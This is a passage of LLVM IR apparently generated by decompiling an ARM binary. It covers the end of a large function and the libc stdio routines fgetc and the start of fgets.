  store i32 10, i32* %r1.global-to-local, align 4
  %v1_1a9a4 = trunc i32 %v1_1a998 to i8
  %v3_1a9a4 = add i32 %v2_1a9a4, -1
  %v4_1a9a4 = inttoptr i32 %v3_1a9a4 to i8*
  store i8 %v1_1a9a4, i8* %v4_1a9a4, align 1
  %v5_1a9a4 = load i32, i32* %r6.global-to-local, align 4
  %v6_1a9a4 = add i32 %v5_1a9a4, -1
  store i32 %v6_1a9a4, i32* %r6.global-to-local, align 4
  %v0_1a9a8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a9a8 = load i32, i32* %r1.global-to-local, align 4
  %v2_1a9a8 = sdiv i32 %v0_1a9a8, %v1_1a9a8
  store i32 %v2_1a9a8, i32* %r0.global-to-local, align 4
  %v0_1a9ac = load i32, i32* %r8.global-to-local, align 4
  %v1_1a9ac = add i32 %v0_1a9ac, 1
  store i32 %v1_1a9ac, i32* %r8.global-to-local, align 4
  %v7_1a9b0 = icmp eq i32 %v1_1a9ac, 3
  store i1 %v7_1a9b0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_1a9a8, i32* %r5.global-to-local, align 4
  br i1 %v7_1a9b0, label %dec_label_pc_1a98c, label %dec_label_pc_1a9bc

dec_label_pc_1a9bc:                               ; preds = %dec_label_pc_1a98c
  %v2_1a9bc = icmp eq i32 %v2_1a9a8, 0
  store i1 %v2_1a9bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a9bc, label %dec_label_pc_1a9c4, label %dec_label_pc_1a98c

dec_label_pc_1a9c4:                               ; preds = %dec_label_pc_1a9bc
  %v1_1a9c4 = add i32 %v5_1a9a4, -2
  store i32 %v1_1a9c4, i32* %r3.global-to-local, align 4
  %v0_1a9c8 = load i32, i32* %sl.global-to-local, align 4
  %v1_1a9c8 = trunc i32 %v0_1a9c8 to i8
  %v4_1a9c8 = inttoptr i32 %v1_1a9c4 to i8*
  store i8 %v1_1a9c8, i8* %v4_1a9c8, align 1
  %v0_1a9cc = load i32, i32* %r3.global-to-local, align 4
  %v1_1a9cc = add i32 %v0_1a9cc, -1
  store i32 %v1_1a9cc, i32* %r2.global-to-local, align 4
  %v0_1a9d0 = load i32, i32* %r4.global-to-local, align 4
  %v1_1a9d0 = trunc i32 %v0_1a9d0 to i8
  %v4_1a9d0 = inttoptr i32 %v1_1a9cc to i8*
  store i8 %v1_1a9d0, i8* %v4_1a9d0, align 1
  store i32 112, i32* %r3.global-to-local, align 4
  %v0_1a9d8 = load i32, i32* %r7.global-to-local, align 4
  %v1_1a9d8 = inttoptr i32 %v0_1a9d8 to i32*
  store i32 112, i32* %v1_1a9d8, align 4
  %v3_1a9d8 = add i32 %v0_1a9d8, 4
  %v4_1a9d8 = inttoptr i32 %v3_1a9d8 to i32*
  %v5_1a9d8 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v5_1a9d8, i32* %v4_1a9d8, align 4
  %v0_1a9dc = load i32, i32* %r2.global-to-local, align 4
  %v1_1a9dc = load i32, i32* %r7.global-to-local, align 4
  %v2_1a9dc = add i32 %v1_1a9dc, 8
  %v3_1a9dc = inttoptr i32 %v2_1a9dc to i32*
  store i32 %v0_1a9dc, i32* %v3_1a9dc, align 4
  %v0_1a9e0 = load i32, i32* %r7.global-to-local, align 4
  %v1_1a9e0 = add i32 %v0_1a9e0, 12
  store i32 %v1_1a9e0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1a9e4

dec_label_pc_1a9e4:                               ; preds = %dec_label_pc_1a95c, %.thread124, %dec_label_pc_1a9c4
  %v1_1a9f0.pre = phi i32 [ %v2_1a4bc, %.thread124 ], [ %v1_1a9e0, %dec_label_pc_1a9c4 ], [ %v1_1a9f0.pre.pre, %dec_label_pc_1a95c ]
  %v2_1a9e4 = ptrtoint i32* %stack_var_-164 to i32
  store i32 %v2_1a9e4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a9e8

dec_label_pc_1a9e8:                               ; preds = %dec_label_pc_1a9e8, %dec_label_pc_1a9e4
  %v0_1a9e8 = phi i32 [ %v2_1a9e4, %dec_label_pc_1a9e4 ], [ %v4_1a9e8, %dec_label_pc_1a9e8 ]
  %stack_var_-188.0 = phi i32 [ %v3_1a358, %dec_label_pc_1a9e4 ], [ %v2_1a9f4, %dec_label_pc_1a9e8 ]
  %v1_1a9e8 = inttoptr i32 %v0_1a9e8 to i32*
  %v2_1a9e8 = load i32, i32* %v1_1a9e8, align 4
  store i32 %v2_1a9e8, i32* %r3.global-to-local, align 4
  %v4_1a9e8 = add i32 %v0_1a9e8, 12
  store i32 %v4_1a9e8, i32* %r2.global-to-local, align 4
  %v3_1a9f0 = icmp ult i32 %v4_1a9e8, %v1_1a9f0.pre
  %v2_1a9f4 = sub i32 %stack_var_-188.0, %v2_1a9e8
  store i32 %v2_1a9f4, i32* %ip.global-to-local, align 4
  br i1 %v3_1a9f0, label %dec_label_pc_1a9e8, label %dec_label_pc_1aa00

dec_label_pc_1aa00:                               ; preds = %dec_label_pc_1a9e8
  %v3_1aa00 = load i8, i8* %stack_var_-46, align 1
  %v4_1aa00 = sext i8 %v3_1aa00 to i32
  store i32 %v4_1aa00, i32* %r3.global-to-local, align 4
  store i32 %v4_1aa00, i32* %r2.global-to-local, align 4
  %v2_1aa04 = icmp eq i8 %v3_1aa00, 0
  store i1 %v2_1aa04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1aa04, label %bb254, label %bb253

bb253:                                            ; preds = %dec_label_pc_1aa00
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb254

bb254:                                            ; preds = %dec_label_pc_1aa00, %bb253
  %v1_1aa64 = phi i32 [ %v4_1aa00, %dec_label_pc_1aa00 ], [ 1, %bb253 ]
  %v2_1aa0c = sub i32 %v2_1a9f4, %v1_1aa64
  store i32 %v2_1aa0c, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r0.global-to-local, align 4
  %v2_1aa14 = ptrtoint i8* %stack_var_-46 to i32
  store i32 %v2_1aa14, i32* %r3.global-to-local, align 4
  %v2_1aa18 = icmp eq i32 %v2_1aa0c, 0
  store i1 %v2_1aa18, i1* %cpsr_z.global-to-local, align 1
  store i32 160, i32* %stack_var_-180, align 4
  %tmp255 = icmp slt i32 %v2_1aa0c, 1
  br i1 %tmp255, label %dec_label_pc_1aa80, label %dec_label_pc_1aa2c

dec_label_pc_1aa2c:                               ; preds = %bb254
  %v3_1aa2c = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1aa2c, i32* %lr.global-to-local, align 4
  %v1_1aa30 = add i32 %v3_1aa2c, 12
  %v2_1aa30 = inttoptr i32 %v1_1aa30 to i32*
  %v3_1aa30 = load i32, i32* %v2_1aa30, align 4
  store i32 %v3_1aa30, i32* %r3.global-to-local, align 4
  %v1_1aa34 = and i32 %v3_1aa30, 8
  %v2_1aa34 = icmp eq i32 %v1_1aa34, 0
  store i1 %v2_1aa34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1aa34, label %dec_label_pc_1aa58, label %dec_label_pc_1aa3c

dec_label_pc_1aa3c:                               ; preds = %dec_label_pc_1aa2c
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -33473), i32* %r3.global-to-local, align 4
  %v1_1aa4c = add i32 %v1_1a9f0.pre, 12
  store i32 %v1_1aa4c, i32* %r6.global-to-local, align 4
  %v1_1aa50 = inttoptr i32 %v1_1a9f0.pre to i32*
  store i32 160, i32* %v1_1aa50, align 4
  %v3_1aa50 = add i32 %v1_1a9f0.pre, 4
  %v4_1aa50 = inttoptr i32 %v3_1aa50 to i32*
  %v5_1aa50 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1aa50, i32* %v4_1aa50, align 4
  %v6_1aa50 = add i32 %v1_1a9f0.pre, 8
  %v7_1aa50 = inttoptr i32 %v6_1aa50 to i32*
  %v8_1aa50 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v8_1aa50, i32* %v7_1aa50, align 4
  br label %dec_label_pc_1aa84

dec_label_pc_1aa58:                               ; preds = %dec_label_pc_1aa2c
  store i32 %v3_1aa2c, i32* %ip.global-to-local, align 4
  %v1_1aa5c = add i32 %v3_1aa2c, 16
  %v2_1aa5c = inttoptr i32 %v1_1aa5c to i32*
  %v3_1aa5c = load i32, i32* %v2_1aa5c, align 4
  store i32 %v3_1aa5c, i32* %r3.global-to-local, align 4
  %v7_1aa60 = icmp eq i32 %v3_1aa5c, 48
  store i1 %v7_1aa60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1aa60, label %.thread54.thread70, label %bb256

bb256:                                            ; preds = %dec_label_pc_1aa58
  store i32 %v2_1a9f4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1aa80

.thread54.thread70:                               ; preds = %dec_label_pc_1aa58
  %v4_1aa6c = load i32, i32* %stack_var_-164, align 4
  store i32 %v1_1a9f0.pre, i32* %r6.global-to-local, align 4
  %v3_1aa74 = add i32 %v4_1aa6c, %v2_1aa0c
  store i32 %v3_1aa74, i32* %r3.global-to-local, align 4
  store i32 %v3_1aa74, i32* %stack_var_-164, align 4
  br label %dec_label_pc_1aa84

dec_label_pc_1aa80:                               ; preds = %bb256, %bb254
  store i32 %v1_1a9f0.pre, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1aa84

dec_label_pc_1aa84:                               ; preds = %.thread54.thread70, %dec_label_pc_1aa3c, %dec_label_pc_1aa80
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_1aa88 = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_1aa88, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1aa8c

dec_label_pc_1aa8c:                               ; preds = %dec_label_pc_1aab4, %dec_label_pc_1aa84
  %v0_1aa8c = phi i32 [ %v1_1aaa8, %dec_label_pc_1aab4 ], [ %v2_1aa88, %dec_label_pc_1aa84 ]
  %v1_1aa8c = inttoptr i32 %v0_1aa8c to i32*
  %v2_1aa8c = load i32, i32* %v1_1aa8c, align 4
  store i32 %v2_1aa8c, i32* %r1.global-to-local, align 4
  %v3_1aa8c = add i32 %v0_1aa8c, 4
  %v4_1aa8c = inttoptr i32 %v3_1aa8c to i32*
  %v5_1aa8c = load i32, i32* %v4_1aa8c, align 4
  store i32 %v5_1aa8c, i32* %r2.global-to-local, align 4
  %v6_1aa8c = add i32 %v0_1aa8c, 8
  %v7_1aa8c = inttoptr i32 %v6_1aa8c to i32*
  %v8_1aa8c = load i32, i32* %v7_1aa8c, align 4
  store i32 %v8_1aa8c, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %arg5, i32* @ip, align 4
  store i32 109216, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg5)
  %v0_1aaa0 = load i32, i32* %r5.global-to-local, align 4
  %v1_1aaa0 = add i32 %v0_1aaa0, 4
  %v2_1aaa0 = inttoptr i32 %v1_1aaa0 to i32*
  %v3_1aaa0 = load i32, i32* %v2_1aaa0, align 4
  store i32 %v3_1aaa0, i32* %r3.global-to-local, align 4
  %v0_1aaa4 = load i32, i32* %r0.global-to-local, align 4
  %v9_1aaa4 = icmp eq i32 %v0_1aaa4, %v3_1aaa0
  store i1 %v9_1aaa4, i1* %cpsr_z.global-to-local, align 1
  %v1_1aaa8 = add i32 %v0_1aaa0, 12
  store i32 %v1_1aaa8, i32* %r5.global-to-local, align 4
  br i1 %v9_1aaa4, label %dec_label_pc_1aab4, label %bb257

bb257:                                            ; preds = %dec_label_pc_1aa8c
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1aad4

dec_label_pc_1aab4:                               ; preds = %dec_label_pc_1aa8c
  %v0_1aab8.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_1aab4 = load i32, i32* %r6.global-to-local, align 4
  %v3_1aab4 = icmp ult i32 %v1_1aaa8, %v1_1aab4
  %v9_1aab4 = icmp eq i32 %v1_1aaa8, %v1_1aab4
  store i1 %v9_1aab4, i1* %cpsr_z.global-to-local, align 1
  %v2_1aab8 = add i32 %v0_1aab8.pre, %v3_1aaa0
  store i32 %v2_1aab8, i32* %r7.global-to-local, align 4
  br i1 %v3_1aab4, label %dec_label_pc_1aa8c, label %dec_label_pc_1aad4

dec_label_pc_1aacc:                               ; preds = %.thread21, %bb239
  %v0_1aacc = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_1aacc, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1a7cc

dec_label_pc_1aad4:                               ; preds = %dec_label_pc_1aab4, %bb257
  %v0_1aad4 = phi i32 [ -1, %bb257 ], [ %v2_1aab8, %dec_label_pc_1aab4 ]
  store i32 %v0_1aad4, i32* %r0.global-to-local, align 4
  store i32 %v27_1a310, i32* @lr, align 4
  ret i32 %v0_1aad4

; uselistorder directives
  uselistorder i32 %v0_1aad4, { 1, 0 }
  uselistorder i32 %v1_1aab4, { 1, 0 }
  uselistorder i32 %v1_1aaa8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1aa8c, { 2, 1, 0 }
  uselistorder i32 %v3_1aa2c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1a9f4, { 0, 1, 3, 2 }
  uselistorder i32 %v4_1a9e8, { 1, 2, 0 }
  uselistorder i32 %v0_1a9e8, { 1, 0 }
  uselistorder i32 %v1_1a9f0.pre, { 6, 5, 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_1a9a8, { 2, 3, 4, 1, 0 }
  uselistorder i32 %v6_1a9a4, { 2, 1, 0 }
  uselistorder i32 %storemerge158, { 1, 0 }
  uselistorder i32 %v0_1a968, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_1a930, { 1, 0 }
  uselistorder i32 %v1_1a930, { 1, 2, 0, 3 }
  uselistorder i32 %v2_1a92c, { 2, 4, 0, 1, 3, 5 }
  uselistorder i1 %v2_1a88c, { 2, 1, 0 }
  uselistorder i32 %v2_1a80c, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v2_1a7fc, { 1, 2, 3, 5, 0, 4, 6 }
  uselistorder i1 %v2_1a7e8, { 1, 0, 2 }
  uselistorder i32 %v5_1a7e4, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1a87430, { 3, 0, 4, 6, 1, 2, 5, 7, 8, 9 }
  uselistorder i1 %v2_1a79c, { 1, 0 }
  uselistorder i32 %v1_1a794, { 1, 2, 0 }
  uselistorder i32 %v2_1a788, { 1, 0 }
  uselistorder i32 %v1_1a788, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1a788, { 3, 4, 0, 5, 6, 1, 2, 7 }
  uselistorder i1 %v3_1a758, { 1, 0 }
  uselistorder i32 %v0_1a758, { 0, 2, 1 }
  uselistorder i32 %v2_1a754, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v1_1a740, { 1, 0 }
  uselistorder i1 %v2_1a730, { 1, 0 }
  uselistorder i32 %v1_1a72c, { 3, 2, 1, 0 }
  uselistorder i32 %v2_1a728, { 1, 0 }
  uselistorder i1 %v2_1a718, { 1, 0 }
  uselistorder i32 %v1_1a70c, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_1a6c0, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1a6c0, { 1, 0, 2 }
  uselistorder i1 %v2_1a6a8, { 1, 0 }
  uselistorder i32 %v5_1a690, { 1, 0 }
  uselistorder i32 %v0_1a67c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1a664, { 1, 2, 0 }
  uselistorder i32 %v2_1a660, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_1a5f8, { 2, 4, 1, 0, 3 }
  uselistorder i32 %stack_var_-192.4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1a5a0, { 1, 0 }
  uselistorder double %v2_1a564, { 1, 0 }
  uselistorder i32 %v0_1a520, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32 %v3_1a514, { 1, 0 }
  uselistorder i32 %v2_1a550, { 1, 3, 0, 2 }
  uselistorder i32 %v0_1a4e4, { 1, 0 }
  uselistorder i32 %v5_1a4a0, { 1, 0 }
  uselistorder i32 %v1_1a3c0.v0_1a3ac5, { 1, 0 }
  uselistorder i32 %v3_1a47c, { 1, 0 }
  uselistorder i32 %v0_1a458, { 0, 2, 3, 1 }
  uselistorder i32 %v2_1a440, { 2, 1, 0 }
  uselistorder i32 %v0_1a424, { 1, 0 }
  uselistorder i32 %v0_1a344, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32* %stack_var_-156, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-83, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-82, { 1, 2, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-47, { 1, 0 }
  uselistorder i32* %stack_var_-164, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-46, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32* %stack_var_0, { 2, 3, 0, 1 }
  uselistorder i32 %tmp160, { 1, 0, 2, 3 }
  uselistorder i32* %sl.global-to-local, { 4, 5, 6, 8, 7, 0, 1, 2, 3 }
  uselistorder i32* %sb.global-to-local, { 4, 5, 6, 7, 8, 9, 2, 1, 0, 3 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 2, 3, 4, 11, 10, 12, 13, 5, 6, 8, 7, 9 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 17, 18, 19, 9, 20, 21, 10, 22, 23, 24, 11, 25, 26, 12, 27, 28, 13, 14, 15, 16, 29, 30, 31, 32, 6, 5, 7, 8 }
  uselistorder i32* %r6.global-to-local, { 17, 0, 18, 1, 2, 3, 4, 19, 16, 20, 22, 21, 8, 9, 5, 10, 11, 6, 12, 7, 13, 14, 15 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 15, 17, 16, 5, 7, 8, 6, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r4.global-to-local, { 7, 8, 9, 10, 11, 13, 12, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 39, 37, 38, 40, 41, 42, 43, 44, 45, 46, 48, 62, 49, 53, 50, 51, 52, 54, 47, 55, 56, 57, 58, 59, 60, 61, 34, 64, 63, 65, 66, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 2, 35, 36, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 17, 18, 19, 20, 21, 22, 26, 23, 27, 28, 24, 25, 29, 30, 31, 34, 32, 33, 35, 36, 9, 11, 10, 12, 13, 14, 15, 16, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 19, 20, 21, 22, 23, 27, 24, 25, 28, 30, 26, 31, 29, 32, 33, 0, 34, 35, 36, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %r0.global-to-local, { 6, 7, 8, 9, 4, 10, 11, 34, 31, 33, 35, 26, 27, 32, 28, 29, 5, 36, 30, 2, 37, 38, 0, 3, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 1 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 2, 3 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 10, 11, 12, 7, 8, 9, 13, 16, 14, 15, 17, 2, 3, 4, 5, 6 }
  uselistorder i32* %fp.global-to-local, { 4, 5, 3, 6, 1, 0, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 25, 37, 38, 39, 40, 41, 42, 43, 44, 26, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 24, 58, 59, 60, 61, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 160, { 0, 1, 3, 2 }
  uselistorder i32 176, { 1, 4, 2, 5, 0, 6, 3 }
  uselistorder i32 57, { 2, 1, 0 }
  uselistorder i32 102, { 1, 2, 3, 4, 0 }
  uselistorder i32 103, { 1, 2, 3, 4, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__aeabi_dcmpge, { 1, 0 }
  uselistorder i32 1104006501, { 4, 1, 2, 0, 3 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -33452), { 0, 2, 1 }
  uselistorder i32 1100470148, { 1, 2, 0, 3 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -33476), { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__aeabi_dcmplt, { 3, 2, 1, 0 }
  uselistorder double 0.000000e+00, { 2, 1, 0, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__aeabi_dcmpeq, { 2, 1, 0 }
  uselistorder i8 32, { 0, 2, 3, 4, 1, 5, 6, 7 }
  uselistorder i8 43, { 0, 2, 1 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg4, { 0, 1, 2, 6, 5, 4, 3, 8, 7, 9 }
  uselistorder label %dec_label_pc_1aacc, { 1, 0 }
  uselistorder label %dec_label_pc_1aa84, { 2, 0, 1 }
  uselistorder label %bb254, { 1, 0 }
  uselistorder label %dec_label_pc_1a9e4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a95c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a92c, { 1, 0 }
  uselistorder label %.thread46, { 1, 0 }
  uselistorder label %dec_label_pc_1a904, { 1, 0 }
  uselistorder label %dec_label_pc_1a8d8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1a8b4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1a884, { 2, 1, 0 }
  uselistorder label %.thread34, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1a7cc, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1a7bc, { 1, 0 }
  uselistorder label %bb236, { 1, 0 }
  uselistorder label %bb234, { 1, 0 }
  uselistorder label %bb232, { 1, 0 }
  uselistorder label %.thread145, { 1, 0 }
  uselistorder label %._crit_edge93, { 1, 0 }
  uselistorder label %bb228, { 1, 0 }
  uselistorder label %bb226, { 1, 0 }
  uselistorder label %.preheader, { 3, 1, 0, 2 }
  uselistorder label %bb223, { 1, 0 }
  uselistorder label %dec_label_pc_1a6e4, { 2, 1, 0 }
  uselistorder label %bb220, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1a5f0, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_1a5a0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1a598, { 1, 0 }
  uselistorder label %bb212, { 1, 0 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %dec_label_pc_1a47c, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_1a398, { 1, 0 }
  uselistorder label %bb205, { 1, 0 }
  uselistorder label %bb203, { 1, 0 }
  uselistorder label %bb201, { 1, 0 }
}

define i32 @__GI_fgetc(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1ab04 = load i32, i32* @r4, align 4
  store i32 %v3_1ab04, i32* %stack_var_-16, align 4
  %v6_1ab04 = load i32, i32* @r5, align 4
  %v12_1ab04 = load i32, i32* @lr, align 4
  %v1_1ab08 = add i32 %arg1, 52
  %v2_1ab08 = inttoptr i32 %v1_1ab08 to i32*
  %v3_1ab08 = load i32, i32* %v2_1ab08, align 4
  %v2_1ab10 = icmp eq i32 %v3_1ab08, 0
  store i32 %arg1, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* %r6.global-to-local, align 4
  br i1 %v2_1ab10, label %dec_label_pc_1ab48, label %dec_label_pc_1ab24

dec_label_pc_1ab24:                               ; preds = %entry
  %v1_1ab24 = add i32 %arg1, 16
  %v2_1ab24 = inttoptr i32 %v1_1ab24 to i32*
  %v3_1ab24 = load i32, i32* %v2_1ab24, align 4
  %v1_1ab28 = add i32 %arg1, 24
  %v2_1ab28 = inttoptr i32 %v1_1ab28 to i32*
  %v3_1ab28 = load i32, i32* %v2_1ab28, align 4
  %v3_1ab2c = icmp ult i32 %v3_1ab24, %v3_1ab28
  br i1 %v3_1ab2c, label %.thread, label %dec_label_pc_1ab3c

.thread:                                          ; preds = %dec_label_pc_1ab24
  %v2_1ab30 = inttoptr i32 %v3_1ab24 to i8*
  %v3_1ab30 = load i8, i8* %v2_1ab30, align 1
  %v4_1ab30 = zext i8 %v3_1ab30 to i32
  store i32 %v4_1ab30, i32* %r4.global-to-local, align 4
  %v6_1ab30 = add i32 %v3_1ab24, 1
  store i32 %v6_1ab30, i32* %v2_1ab24, align 4
  br label %dec_label_pc_1abbc

dec_label_pc_1ab3c:                               ; preds = %dec_label_pc_1ab24
  %v1_1ab3c = inttoptr i32 %arg1 to i16*
  %v2_1ab3c = call i32 @getc_unlocked(i16* %v1_1ab3c)
  store i32 %v2_1ab3c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1abbc

dec_label_pc_1ab48:                               ; preds = %entry
  %v1_1ab4c = add i32 %arg1, 56
  store i32 %v1_1ab4c, i32* @r4, align 4
  %v4_1ab60 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 80) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_1ab60)
  %v0_1ab74 = load i32, i32* %r6.global-to-local, align 4
  %v2_1ab74 = add i32 %v0_1ab74, 20
  %v3_1ab74 = inttoptr i32 %v2_1ab74 to i32*
  %v4_1ab74 = load i32, i32* %v3_1ab74, align 4
  store i32 109440, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1ab74)
  %v0_1ab80 = load i32, i32* @r5, align 4
  %v1_1ab80 = add i32 %v0_1ab80, 16
  %v2_1ab80 = inttoptr i32 %v1_1ab80 to i32*
  %v3_1ab80 = load i32, i32* %v2_1ab80, align 4
  %v1_1ab84 = add i32 %v0_1ab80, 24
  %v2_1ab84 = inttoptr i32 %v1_1ab84 to i32*
  %v3_1ab84 = load i32, i32* %v2_1ab84, align 4
  %v3_1ab88 = icmp ult i32 %v3_1ab80, %v3_1ab84
  br i1 %v3_1ab88, label %.thread2, label %dec_label_pc_1ab98

.thread2:                                         ; preds = %dec_label_pc_1ab48
  %v2_1ab8c = inttoptr i32 %v3_1ab80 to i8*
  %v3_1ab8c = load i8, i8* %v2_1ab8c, align 1
  %v4_1ab8c = zext i8 %v3_1ab8c to i32
  store i32 %v4_1ab8c, i32* %r4.global-to-local, align 4
  %v6_1ab8c = add i32 %v3_1ab80, 1
  store i32 %v6_1ab8c, i32* %v2_1ab80, align 4
  br label %dec_label_pc_1aba4

dec_label_pc_1ab98:                               ; preds = %dec_label_pc_1ab48
  %v1_1ab9c = inttoptr i32 %v0_1ab80 to i16*
  %v2_1ab9c = call i32 @getc_unlocked(i16* %v1_1ab9c)
  store i32 %v2_1ab9c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1aba4

dec_label_pc_1aba4:                               ; preds = %.thread2, %dec_label_pc_1ab98
  %v0_1abb0 = load i32, i32* %r6.global-to-local, align 4
  %v2_1abb0 = add i32 %v0_1abb0, 28
  %v3_1abb0 = inttoptr i32 %v2_1abb0 to i32*
  %v4_1abb0 = load i32, i32* %v3_1abb0, align 4
  store i32 %v4_1abb0, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_1abb0)
  br label %dec_label_pc_1abbc

dec_label_pc_1abbc:                               ; preds = %.thread, %dec_label_pc_1ab3c, %dec_label_pc_1aba4
  %v0_1abbc = load i32, i32* %r4.global-to-local, align 4
  %v2_1abc4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1abc4, i32* @r4, align 4
  store i32 %v6_1ab04, i32* @r5, align 4
  store i32 %v12_1ab04, i32* @lr, align 4
  ret i32 %v0_1abbc

; uselistorder directives
  uselistorder i32 %v3_1ab80, { 1, 0, 2 }
  uselistorder i32 %v3_1ab24, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 5, 2, 4, 3, 0, 1 }
  uselistorder label %dec_label_pc_1abbc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1aba4, { 1, 0 }
}

define i32 @function_1abd0(i32 %arg1) local_unnamed_addr {
dec_label_pc_1abd0:
  %v0_1abd0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1abd0, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1abd0
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1abd0, %bb
  %v10_1abdc = phi i32 [ %arg1, %dec_label_pc_1abd0 ], [ 0, %bb ]
  ret i32 %v10_1abdc

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_1abe0 = load i32, i32* @r4, align 4
